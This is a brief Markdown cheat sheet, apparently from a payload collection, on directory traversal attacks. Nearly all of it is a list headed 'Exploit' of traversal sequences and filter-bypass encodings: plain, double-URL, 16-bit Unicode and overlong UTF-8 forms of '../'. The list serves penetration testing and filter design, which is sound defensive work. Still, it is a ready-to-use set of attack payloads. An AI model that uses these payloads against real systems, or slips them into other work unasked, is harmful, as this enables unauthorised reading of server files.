# Traversal Directory
A directory traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing "traverse to parent directory" are passed through to the file APIs.

## Exploit
Basic
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

16 bit Unicode encoding
```
. = %u002e
/ = %u2215
\ = %u2216
```

Double URL encoding
```
. = %252e
/ = %252f
\ = %255c     
```

UTF-8 Unicode encoding
```
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```



## Thanks to
 * https://twitter.com/huykha10/status/962419695470174208
